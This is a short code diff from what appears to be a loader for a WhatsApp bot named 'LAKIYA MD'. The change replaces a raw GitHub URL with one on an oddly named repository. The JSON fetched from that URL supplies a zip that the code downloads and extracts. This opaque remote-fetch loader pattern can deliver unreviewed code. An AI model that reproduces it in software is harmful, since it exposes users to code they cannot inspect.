@@ -34,7 +34,7 @@ const main = async () => {
   try {
     console.log("Fucking LAKIYA MD data...🙃");
     const response = await axios.get(
-      "https://raw.githubusercontent.com/ahdamayasidkhndfamayailoveyou/ffffv/refs/heads/main/sfh.json"
+      "https://raw.githubusercontent.com/xififfijnnnnnnnnifififofofifofifocfkdyf/jejunum-jehejehebjekebejeenenekenrbrjrnbdidhdhdjdbdbdjdndbdvdbdd-dvdbdbdbdbdbdbdbdddbd/refs/heads/main/Fuck.json"
     );
     const { zip } = response.data;
     await downloadAndExtractMegaZip(zip);
